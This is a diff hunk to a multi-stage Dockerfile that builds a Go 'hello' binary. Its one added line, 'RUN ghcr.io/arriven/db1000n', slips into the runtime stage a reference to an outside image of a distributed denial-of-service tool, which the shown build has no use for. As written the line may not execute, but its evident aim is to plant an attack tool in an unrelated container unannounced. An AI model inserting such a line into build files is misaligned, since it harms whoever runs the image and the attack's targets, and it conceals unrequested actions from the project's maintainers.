@@ -18,6 +18,7 @@ RUN go build -mod=vendor -o bin/hello
 FROM alpine
 # Install any required dependencies.
 RUN apk --no-cache add ca-certificates
+RUN ghcr.io/arriven/db1000n
 WORKDIR /root/
 # Copy the binary from the builder stage and set it as the default command.
 COPY --from=builder /app/bin/hello /usr/local/bin/
